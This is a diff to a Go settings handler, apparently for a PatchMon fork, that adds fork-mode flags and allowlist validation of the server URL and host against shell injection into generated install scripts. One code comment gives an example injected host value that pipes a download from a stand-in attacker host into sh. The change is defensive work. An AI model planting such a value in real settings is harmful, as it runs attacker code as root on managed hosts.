@@ -2,8 +2,10 @@ package handler
 
 import (
 	"encoding/base64"
+	"errors"
 	"log/slog"
 	"net/http"
+	"net/url"
 	"os"
 	"regexp"
 	"strconv"
@@ -49,7 +51,7 @@ func (h *SettingsHandler) Get(w http.ResponseWriter, r *http.Request) {
 		Error(w, http.StatusInternalServerError, "Failed to load settings")
 		return
 	}
-	JSON(w, http.StatusOK, settingsToResponse(s, h.enc))
+	JSON(w, http.StatusOK, settingsToResponse(s, h.enc, h.cfg != nil && h.cfg.DisableSignup, h.cfg != nil && h.cfg.HideCommunityLinks, h.cfg != nil && h.cfg.IgnoreDefinitionUpdates))
 }
 
 // GetServerURL handles GET /settings/server-url (public, used by install commands and Add Host wizard).
@@ -101,10 +103,18 @@ func (h *SettingsHandler) VersionCurrent(version string) http.HandlerFunc {
 		if s.LastUpdateCheck != nil {
 			lastCheck = s.LastUpdateCheck.Format(time.RFC3339)
 		}
+		var latestVersion interface{} = s.LatestVersion
+		updateAvailable := s.UpdateAvailable
+		if h.cfg != nil && h.cfg.HideCommunityLinks {
+			// Fork mode: updates ship via the fork's own image pipeline, so the
+			// upstream latest/update-available info (possibly stale in the DB) is masked.
+			latestVersion = nil
+			updateAvailable = false
+		}
 		JSON(w, http.StatusOK, map[string]interface{}{
 			"version":             version,
-			"latest_version":      s.LatestVersion,
-			"is_update_available": s.UpdateAvailable,
+			"latest_version":      latestVersion,
+			"is_update_available": updateAvailable,
 			"last_update_check":   lastCheck,
 			"buildDate":           time.Now().UTC().Format(time.RFC3339),
 			"environment":         "production",
@@ -124,6 +134,22 @@ func (h *SettingsHandler) VersionCheckUpdates(currentVersion string) http.Handle
 		s, err := h.settings.GetFirst(ctx)
 		if err != nil {
 			Error(w, http.StatusBadRequest, "Settings not found")
+			return
+		}
+
+		// Fork mode: no upstream DNS beacon, no upstream release links.
+		if h.cfg != nil && h.cfg.HideCommunityLinks {
+			var lastCheck interface{}
+			if s.LastUpdateCheck != nil {
+				lastCheck = s.LastUpdateCheck.Format(time.RFC3339)
+			}
+			JSON(w, http.StatusOK, map[string]interface{}{
+				"currentVersion":    currentVersion,
+				"latestVersion":     currentVersion,
+				"isUpdateAvailable": false,
+				"lastUpdateCheck":   lastCheck,
+				"latestRelease":     nil,
+			})
 			return
 		}
 
@@ -254,7 +280,7 @@ func (h *SettingsHandler) GetLoginSettings(w http.ResponseWriter, r *http.Reques
 		if h.cfg != nil && (h.cfg.AdminMode || h.cfg.RegistryDatabaseURL != "") {
 			showGithubVersionFallback = false
 		}
-		showNewsletter := h.cfg == nil || !h.cfg.AdminMode
+		showNewsletter := h.cfg == nil || (!h.cfg.AdminMode && !h.cfg.HideCommunityLinks)
 		adminMode := h.cfg != nil && h.cfg.AdminMode
 		JSON(w, http.StatusOK, map[string]interface{}{
 			"signup_enabled":               false,
@@ -302,10 +328,10 @@ func (h *SettingsHandler) GetLoginSettings(w http.ResponseWriter, r *http.Reques
 		showGithubVersion = false
 	}
 
-	showNewsletter := h.cfg == nil || !h.cfg.AdminMode
+	showNewsletter := h.cfg == nil || (!h.cfg.AdminMode && !h.cfg.HideCommunityLinks)
 	adminMode := h.cfg != nil && h.cfg.AdminMode
 	signupEnabled := s.SignupEnabled
-	if h.cfg != nil && h.cfg.AdminMode {
+	if h.cfg != nil && (h.cfg.AdminMode || h.cfg.DisableSignup) {
 		signupEnabled = false
 	}
 	JSON(w, http.StatusOK, map[string]interface{}{
@@ -458,10 +484,11 @@ func buildEnvironmentVariables(cfg *config.Config, resolved *config.ResolvedConf
 		{Category: "Server", Key: "CORS_ORIGIN", EffectiveValue: corsEffective, EffectiveSource: corsSource, EnvValue: env("CORS_ORIGIN"), DBValue: dbStr(s.CorsOrigin), DefaultValue: "http://localhost:3000", Editable: true, Conflict: env("CORS_ORIGIN") != "" && s.CorsOrigin != nil && *s.CorsOrigin != "", Description: "Allowed origin for CORS (frontend URL). Comma-separated for multiple origins. Requires a server restart to take effect."},
 		{Category: "Server", Key: "ENABLE_HSTS", EffectiveValue: boolStr(resolved.EnableHSTS), EffectiveSource: source(env("ENABLE_HSTS"), dbBool(s.EnableHSTS), "false"), EnvValue: env("ENABLE_HSTS"), DBValue: dbBool(s.EnableHSTS), DefaultValue: "false", Editable: true, Conflict: env("ENABLE_HSTS") != "" && s.EnableHSTS != nil, Description: "Enable HSTS header for HTTPS"},
 		{Category: "Server", Key: "TRUST_PROXY", EffectiveValue: trustProxyStr, EffectiveSource: source(env("TRUST_PROXY"), dbBool(s.TrustProxy), "true"), EnvValue: env("TRUST_PROXY"), DBValue: dbBool(s.TrustProxy), DefaultValue: "true", Editable: true, Conflict: env("TRUST_PROXY") != "" && s.TrustProxy != nil, Description: "Trust proxy headers (X-Forwarded-Proto / X-Forwarded-For) from a reverse proxy. Default true; set to false only if PatchMon is exposed directly to the internet without a proxy."},
+		{Category: "Server", Key: "TRUSTED_PROXY_RANGES", EffectiveValue: strings.Join(cfg.TrustedProxyRanges, ", "), EffectiveSource: source(env("TRUSTED_PROXY_RANGES"), "", ""), EnvValue: env("TRUSTED_PROXY_RANGES"), DBValue: "", DefaultValue: "(empty)", Editable: false, Conflict: false, Description: "Comma-separated CIDRs or IPs of reverse proxies in front of PatchMon, used to resolve the real client IP from X-Forwarded-For. Leave empty for a single proxy; set it when proxies are chained (e.g. Cloudflare in front of NPM). Env only, and deliberately not editable here: widening it would allow X-Forwarded-For spoofing."},
 		{Category: "Server", Key: "PORT", EffectiveValue: strconv.Itoa(cfg.Port), EffectiveSource: source(env("PORT"), "", "3001"), EnvValue: env("PORT"), DBValue: "", DefaultValue: "3001", Editable: false, Conflict: false, Description: "Backend API port; configure via .env"},
 		{Category: "Server", Key: "APP_ENV", EffectiveValue: cfg.Env, EffectiveSource: source(env("APP_ENV"), "", envDefault("NODE_ENV", "production")), EnvValue: env("APP_ENV"), DBValue: "", DefaultValue: "production", Editable: false, Conflict: false, Description: "Environment mode (production/development)"},
 		{Category: "Server", Key: "TIMEZONE", EffectiveValue: resolved.Timezone, EffectiveSource: source(envTzOrTimezone(), dbStr(s.Timezone), "UTC"), EnvValue: envTzOrTimezone(), DBValue: dbStr(s.Timezone), DefaultValue: "UTC", Editable: true, Conflict: envTzOrTimezone() != "" && s.Timezone != nil && *s.Timezone != "", Description: "IANA timezone (e.g. America/New_York, Europe/London)"},
-		{Category: "Logging", Key: "ENABLE_LOGGING", EffectiveValue: enableLoggingStr, EffectiveSource: source(env("ENABLE_LOGGING"), dbBool(s.EnableLogging), "false"), EnvValue: env("ENABLE_LOGGING"), DBValue: dbBool(s.EnableLogging), DefaultValue: "false", Editable: true, Conflict: env("ENABLE_LOGGING") != "" && s.EnableLogging != nil, Description: "Enable backend logging to stdout"},
+		{Category: "Logging", Key: "ENABLE_LOGGING", EffectiveValue: enableLoggingStr, EffectiveSource: source(env("ENABLE_LOGGING"), dbBool(s.EnableLogging), "true"), EnvValue: env("ENABLE_LOGGING"), DBValue: dbBool(s.EnableLogging), DefaultValue: "true", Editable: true, Conflict: env("ENABLE_LOGGING") != "" && s.EnableLogging != nil, Description: "Enable backend logging to stdout"},
 		{Category: "Logging", Key: "LOG_LEVEL", EffectiveValue: logLevelEffective, EffectiveSource: source(env("LOG_LEVEL"), dbStr(s.LogLevel), "info"), EnvValue: env("LOG_LEVEL"), DBValue: dbStr(s.LogLevel), DefaultValue: "info", Editable: true, Conflict: env("LOG_LEVEL") != "" && s.LogLevel != nil && *s.LogLevel != "", Description: "Log level: debug, info, warn, error"},
 		{Category: "Authentication", Key: "MAX_LOGIN_ATTEMPTS", EffectiveValue: strconv.Itoa(resolved.MaxLoginAttempts), EffectiveSource: source(env("MAX_LOGIN_ATTEMPTS"), dbInt(s.MaxLoginAttempts), strconv.Itoa(cfg.MaxLoginAttempts)), EnvValue: env("MAX_LOGIN_ATTEMPTS"), DBValue: dbInt(s.MaxLoginAttempts), DefaultValue: "5", Editable: true, Conflict: env("MAX_LOGIN_ATTEMPTS") != "" && s.MaxLoginAttempts != nil, Description: "Max failed login attempts before lockout"},
 		{Category: "Authentication", Key: "LOCKOUT_DURATION_MINUTES", EffectiveValue: strconv.Itoa(resolved.LockoutDurationMin), EffectiveSource: source(env("LOCKOUT_DURATION_MINUTES"), dbInt(s.LockoutDurationMinutes), "15"), EnvValue: env("LOCKOUT_DURATION_MINUTES"), DBValue: dbInt(s.LockoutDurationMinutes), DefaultValue: "15", Editable: true, Conflict: env("LOCKOUT_DURATION_MINUTES") != "" && s.LockoutDurationMinutes != nil, Description: "Lockout duration in minutes"},
@@ -613,10 +640,13 @@ func (h *SettingsHandler) GetPublic(w http.ResponseWriter, r *http.Request) {
 		// No settings row — resolve timezone from env/config defaults (no DB value).
 		adminMode := h.cfg != nil && h.cfg.AdminMode
 		JSON(w, http.StatusOK, map[string]interface{}{
-			"auto_update":    false,
-			"alerts_enabled": true,
-			"timezone":       config.ResolveTimezone(nil, h.cfg),
-			"admin_mode":     adminMode,
+			"auto_update":     false,
+			"alerts_enabled":  true,
+			"timezone":        config.ResolveTimezone(nil, h.cfg),
+			"admin_mode":      adminMode,
+			"show_newsletter": h.cfg == nil || (!h.cfg.AdminMode && !h.cfg.HideCommunityLinks),
+			// fork: PM_IGNORE_DEFINITION_UPDATES
+			"ignore_definition_updates": h.cfg != nil && h.cfg.IgnoreDefinitionUpdates,
 		})
 		return
 	}
@@ -627,14 +657,17 @@ func (h *SettingsHandler) GetPublic(w http.ResponseWriter, r *http.Request) {
 
 	adminMode := h.cfg != nil && h.cfg.AdminMode
 	JSON(w, http.StatusOK, map[string]interface{}{
-		"auto_update":    s.AutoUpdate,
-		"alerts_enabled": s.AlertsEnabled,
-		"logo_dark":      s.LogoDark,
-		"logo_light":     s.LogoLight,
-		"favicon":        s.Favicon,
-		"updated_at":     s.UpdatedAt,
-		"timezone":       timezone,
-		"admin_mode":     adminMode,
+		"auto_update":     s.AutoUpdate,
+		"alerts_enabled":  s.AlertsEnabled,
+		"logo_dark":       s.LogoDark,
+		"logo_light":      s.LogoLight,
+		"favicon":         s.Favicon,
+		"updated_at":      s.UpdatedAt,
+		"timezone":        timezone,
+		"admin_mode":      adminMode,
+		"show_newsletter": h.cfg == nil || (!h.cfg.AdminMode && !h.cfg.HideCommunityLinks),
+		// fork: PM_IGNORE_DEFINITION_UPDATES
+		"ignore_definition_updates": h.cfg != nil && h.cfg.IgnoreDefinitionUpdates,
 	})
 }
 
@@ -652,8 +685,10 @@ func (h *SettingsHandler) Update(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// In managed/multi-context mode, prevent self-registration from being enabled.
-	if h.cfg != nil && h.cfg.AdminMode {
+	// In managed/multi-context mode or with PM_DISABLE_SIGNUP, prevent
+	// self-registration from being enabled - the field is stripped so API
+	// calls cannot flip it either (fail-closed).
+	if h.cfg != nil && (h.cfg.AdminMode || h.cfg.DisableSignup) {
 		delete(req, "signupEnabled")
 		delete(req, "signup_enabled")
 	}
@@ -662,7 +697,10 @@ func (h *SettingsHandler) Update(w http.ResponseWriter, r *http.Request) {
 	oldComplianceScanInterval := s.ComplianceScanInterval
 	oldPackageCacheRefreshMode := s.PackageCacheRefreshMode
 	oldPackageCacheRefreshMaxAge := s.PackageCacheRefreshMaxAge
-	applySettingsUpdate(s, req, h.enc)
+	if err := applySettingsUpdate(s, req, h.enc); err != nil {
+		Error(w, http.StatusBadRequest, err.Error())
+		return
+	}
 
 	if err := h.settings.Update(r.Context(), s); err != nil {
 		Error(w, http.StatusInternalServerError, "Failed to update settings")
@@ -693,14 +731,25 @@ func (h *SettingsHandler) Update(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
-	JSON(w, http.StatusOK, settingsToResponse(s, h.enc))
+	JSON(w, http.StatusOK, settingsToResponse(s, h.enc, h.cfg != nil && h.cfg.DisableSignup, h.cfg != nil && h.cfg.HideCommunityLinks, h.cfg != nil && h.cfg.IgnoreDefinitionUpdates))
 }
 
-func settingsToResponse(s *models.Settings, enc *util.Encryption) map[string]interface{} {
+func settingsToResponse(s *models.Settings, enc *util.Encryption, signupLocked bool, forkMode bool, ignoreDefinitionUpdates bool) map[string]interface{} {
 	discordSecretSet := false
 	if s.DiscordClientSecret != nil && *s.DiscordClientSecret != "" && enc != nil {
 		_, err := enc.Decrypt(*s.DiscordClientSecret)
 		discordSecretSet = err == nil
+	}
+	// Fork mode (PM_HIDE_COMMUNITY_LINKS): mask possibly stale upstream version
+	// info so no "update available" banner is fed from the old DNS-beacon
+	// checks, and report telemetry as off (the send job is hard-disabled).
+	latestVersion := s.LatestVersion
+	updateAvailable := s.UpdateAvailable
+	metricsEnabled := s.MetricsEnabled
+	if forkMode {
+		latestVersion = nil
+		updateAvailable = false
+		metricsEnabled = false
 	}
 	res := map[string]interface{}{
 		"id": s.ID, "server_url": s.ServerURL, "server_protocol": s.ServerProtocol,
@@ -711,12 +760,13 @@ func settingsToResponse(s *models.Settings, enc *util.Encryption) map[string]int
 		"package_cache_refresh_mode": s.PackageCacheRefreshMode, "package_cache_refresh_max_age": s.PackageCacheRefreshMaxAge,
 		"github_repo_url": s.GithubRepoURL,
 		"ssh_key_path":    s.SSHKeyPath, "repository_type": s.RepositoryType,
-		"last_update_check": s.LastUpdateCheck, "latest_version": s.LatestVersion,
-		"update_available": s.UpdateAvailable,
+		"last_update_check": s.LastUpdateCheck, "latest_version": latestVersion,
+		"update_available": updateAvailable,
 		"signup_enabled":   s.SignupEnabled, "default_user_role": s.DefaultUserRole,
+		"signup_locked":          signupLocked,
 		"ignore_ssl_self_signed": s.IgnoreSSLSelfSigned,
 		"logo_dark":              s.LogoDark, "logo_light": s.LogoLight, "favicon": s.Favicon,
-		"metrics_enabled": s.MetricsEnabled, "metrics_anonymous_id": s.MetricsAnonymousID,
+		"metrics_enabled": metricsEnabled, "metrics_anonymous_id": s.MetricsAnonymousID,
 		"metrics_last_sent":            s.MetricsLastSent,
 		"show_github_version_on_login": s.ShowGithubVersionOnLogin,
 		"ai_enabled":                   s.AiEnabled, "ai_provider": s.AiProvider, "ai_model": s.AiModel,
@@ -724,6 +774,10 @@ func settingsToResponse(s *models.Settings, enc *util.Encryption) map[string]int
 		"discord_oauth_enabled": s.DiscordOAuthEnabled, "discord_client_id": s.DiscordClientID,
 		"discord_client_secret_set": discordSecretSet,
 		"discord_redirect_uri":      s.DiscordRedirectURI, "discord_button_text": s.DiscordButtonText,
+		// fork: PM_IGNORE_DEFINITION_UPDATES - HostDetail.jsx falls back to the
+		// full settings response on 401/403 from /settings/public, so this must
+		// be here too or the hint silently disappears for those users.
+		"ignore_definition_updates": ignoreDefinitionUpdates,
 	}
 	return res
 }
@@ -782,27 +836,151 @@ func constructServerURL(protocol, host string, port int) string {
 	return proto + "://" + host + ":" + strconv.Itoa(port)
 }
 
-func applySettingsUpdate(s *models.Settings, req map[string]interface{}, enc *util.Encryption) {
+// serverURLSafeChars restricts a server URL to the characters a real one needs.
+//
+// Before widening this set, note that the value reaches THREE sinks with three
+// different escaping rules. All are currently safe, but only because the
+// allowlist happens to exclude the metacharacters of all three:
+//
+//  1. POSIX sh, double-quoted (install.go, auto_enrollment.go):
+//     export PATCHMON_URL="<value>"
+//     Dangerous: " \ ` $
+//
+//  2. PowerShell, double-quoted (install.go, the Windows branch):
+//     $env:PATCHMON_SERVER_URL = "<value>"
+//     Dangerous: $( ) and the BACKTICK, which is PowerShell's escape character
+//     rather than command substitution. Also , and @ carry meaning in
+//     PowerShell argument parsing.
+//
+//  3. POSIX sh, SINGLE-quoted, second order (proxmox_auto_enroll.sh):
+//     pct exec "$vmid" -- sh -c "... curl ... '<value>' && sh installer"
+//     The value is expanded by the outer shell and lands inside single quotes
+//     in a root shell INSIDE the container. Dangerous: the single quote.
+//
+// These scripts are documented to be piped into sh as root on every managed
+// host, so a settings write turning into code execution is a fleet-wide
+// compromise. Restricting the character set is the reliable guard; url.Parse
+// alone accepts plenty of strings that are hostile in a shell.
+//
+// [ and ] ARE permitted, for IPv6 literals. They are glob metacharacters, which
+// only matter in an UNQUOTED expansion, and every expansion of this value in
+// every generated script is quoted. If an unquoted one is ever added, that
+// changes.
+//
+// The trailing `$` is end-of-TEXT in Go's regexp, not PCRE's end-of-line, so a
+// trailing newline is rejected rather than slipping through. That is
+// load-bearing and easy to break by adding (?m).
+var serverURLSafeChars = regexp.MustCompile(`^[A-Za-z0-9._:/\[\]-]+$`)
+
+// serverHostSafeChars covers hostnames, IPv4 literals, and bracketed IPv6.
+var serverHostSafeChars = regexp.MustCompile(`^[A-Za-z0-9._:\[\]-]+$`)
+
+// validateServerURL rejects a server URL that is malformed or unsafe to embed
+// in the generated shell scripts.
+func validateServerURL(raw string) error {
+	if raw == "" {
+		return nil
+	}
+	if len(raw) > 2048 {
+		return errors.New("server URL is too long")
+	}
+	if !serverURLSafeChars.MatchString(raw) {
+		return errors.New("server URL contains disallowed characters")
+	}
+	u, err := url.Parse(raw)
+	if err != nil {
+		return errors.New("server URL is not a valid URL")
+	}
+	if u.Scheme != "http" && u.Scheme != "https" {
+		return errors.New("server URL must use http or https")
+	}
+	if u.Host == "" {
+		return errors.New("server URL must include a host")
+	}
+	// url.Parse does not range-check the port unless it is asked for it, so
+	// http://a.com:99999999999999999999 parses happily. Bound it here to match
+	// validateServerURLParts rather than leaving the two disagreeing.
+	if port := u.Port(); port != "" {
+		n, err := strconv.Atoi(port)
+		if err != nil || n < 1 || n > 65535 {
+			return errors.New("server URL port must be between 1 and 65535")
+		}
+	}
+	return nil
+}
+
+// validateServerURLParts checks the protocol/host/port trio, which feeds
+// constructServerURL and therefore reaches the same shell scripts.
+func validateServerURLParts(protocol, host string, port int, hasProtocol, hasHost, hasPort bool) error {
+	if hasProtocol {
+		switch strings.ToLower(protocol) {
+		case "http", "https":
+		default:
+			return errors.New("server protocol must be http or https")
+		}
+	}
+	if hasHost {
+		if host == "" || len(host) > 253 || !serverHostSafeChars.MatchString(host) {
+			return errors.New("server host is not a valid hostname")
+		}
+	}
+	if hasPort && (port < 1 || port > 65535) {
+		return errors.New("server port must be between 1 and 65535")
+	}
+	return nil
+}
+
+func applySettingsUpdate(s *models.Settings, req map[string]interface{}, enc *util.Encryption) error {
 	urlVal, hasExplicitURL := getReqString(req, "server_url", "serverUrl")
+	protoVal, hasProtocolVal := getReqString(req, "server_protocol", "serverProtocol")
+	hostVal, hasHostVal := getReqString(req, "server_host", "serverHost")
+	portVal, hasPortVal := getReqFloat64(req, "server_port", "serverPort")
+
+	// Validate before mutating so a rejected request leaves settings untouched.
+	if hasExplicitURL {
+		if err := validateServerURL(urlVal); err != nil {
+			return err
+		}
+	}
+	if err := validateServerURLParts(protoVal, hostVal, int(portVal), hasProtocolVal, hasHostVal, hasPortVal); err != nil {
+		return err
+	}
+
 	if hasExplicitURL {
 		s.ServerURL = urlVal
 	}
-	if v, ok := getReqString(req, "server_protocol", "serverProtocol"); ok {
-		s.ServerProtocol = v
+	if hasProtocolVal {
+		s.ServerProtocol = protoVal
 	}
-	if v, ok := getReqString(req, "server_host", "serverHost"); ok {
-		s.ServerHost = v
+	if hasHostVal {
+		s.ServerHost = hostVal
 	}
-	if v, ok := getReqFloat64(req, "server_port", "serverPort"); ok {
-		s.ServerPort = int(v)
+	if hasPortVal {
+		s.ServerPort = int(portVal)
 	}
 	// Derive server_url from protocol/host/port when any of those were updated (matches Node backend behavior).
 	// Only derive when server_url was not explicitly sent (explicit URL takes precedence).
-	_, hasProtocol := getReqString(req, "server_protocol", "serverProtocol")
-	_, hasHost := getReqString(req, "server_host", "serverHost")
-	_, hasPort := getReqFloat64(req, "server_port", "serverPort")
-	if !hasExplicitURL && (hasProtocol || hasHost || hasPort) {
-		s.ServerURL = constructServerURL(s.ServerProtocol, s.ServerHost, s.ServerPort)
+	if !hasExplicitURL && (hasProtocolVal || hasHostVal || hasPortVal) {
+		// Validate the DERIVED value, not just the incoming fields.
+		//
+		// validateServerURLParts only inspects the fields present in this
+		// request, but the URL is built from a mix of new and already-stored
+		// values. A request supplying only server_port therefore composed
+		// itself with a stored server_host that this validator never saw:
+		//
+		//   stored host: evil.com";curl http://evil/x|sh;#
+		//   PATCH {"server_port": 443}
+		//   -> http://evil.com";curl http://evil/x|sh;#:443
+		//
+		// which validateServerURL would reject, but was never asked about.
+		// Reachable on any instance whose server_host was poisoned before this
+		// validation existed, or written outside this handler (the
+		// multi-context provisioner writes context databases directly).
+		candidate := constructServerURL(s.ServerProtocol, s.ServerHost, s.ServerPort)
+		if err := validateServerURL(candidate); err != nil {
+			return err
+		}
+		s.ServerURL = candidate
 	}
 	if v, ok := getReqFloat64(req, "update_interval", "updateInterval"); ok {
 		s.UpdateInterval = int(v)
@@ -916,6 +1094,7 @@ func applySettingsUpdate(s *models.Settings, req map[string]interface{}, enc *ut
 			s.AiAPIKey = &v
 		}
 	}
+	return nil
 }
 
 // logoUploadReq is the request body for POST /settings/logos/upload.
